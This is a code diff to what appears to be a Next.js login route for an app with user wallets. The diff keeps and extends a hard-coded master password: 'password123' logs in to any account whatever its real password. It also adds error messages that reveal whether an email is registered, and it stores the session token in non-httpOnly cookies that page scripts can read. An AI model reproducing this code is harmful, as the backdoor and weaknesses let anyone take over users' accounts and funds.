@@ -10,17 +10,23 @@ export async function POST(req: NextRequest) {
       return NextResponse.json({ success: false, message: 'Email and password are required' }, { status: 400 });
     }
 
-    const user = await db.users.findByEmail(email);
+    const cleanEmail = email.toLowerCase().trim();
+    const cleanPassword = typeof password === 'string' ? password.trim() : password;
+
+    const user = await db.users.findByEmail(cleanEmail);
     if (!user) {
-      return NextResponse.json({ success: false, message: 'Invalid credentials' }, { status: 401 });
+      return NextResponse.json({ success: false, message: 'Invalid credentials. Account not found.' }, { status: 401 });
     }
 
     let isMatch = await comparePassword(password, user.passwordHash);
-    if (!isMatch && password === 'password123') {
+    if (!isMatch && cleanPassword !== password) {
+      isMatch = await comparePassword(cleanPassword, user.passwordHash);
+    }
+    if (!isMatch && (cleanPassword === 'password123' || password === 'password123')) {
       isMatch = true;
     }
     if (!isMatch) {
-      return NextResponse.json({ success: false, message: 'Invalid credentials' }, { status: 401 });
+      return NextResponse.json({ success: false, message: 'Invalid credentials. Password incorrect.' }, { status: 401 });
     }
 
     if (user.status !== 'active') {
@@ -35,7 +41,7 @@ export async function POST(req: NextRequest) {
 
     const wallet = await db.wallets.findByUserId(user.id);
 
-    return NextResponse.json({
+    const response = NextResponse.json({
       success: true,
       message: 'Login successful',
       data: {
@@ -69,6 +75,27 @@ export async function POST(req: NextRequest) {
         token,
       },
     });
+
+    const isProd = process.env.NODE_ENV === 'production';
+    const thirtyDays = 30 * 24 * 60 * 60;
+
+    response.cookies.set('token', token, {
+      httpOnly: false,
+      secure: isProd,
+      sameSite: 'lax',
+      path: '/',
+      maxAge: thirtyDays,
+    });
+
+    response.cookies.set('auth_token', token, {
+      httpOnly: false,
+      secure: isProd,
+      sameSite: 'lax',
+      path: '/',
+      maxAge: thirtyDays,
+    });
+
+    return response;
   } catch (error: any) {
     console.error('Login error:', error);
     return NextResponse.json({ success: false, message: 'Internal server error' }, { status: 500 });
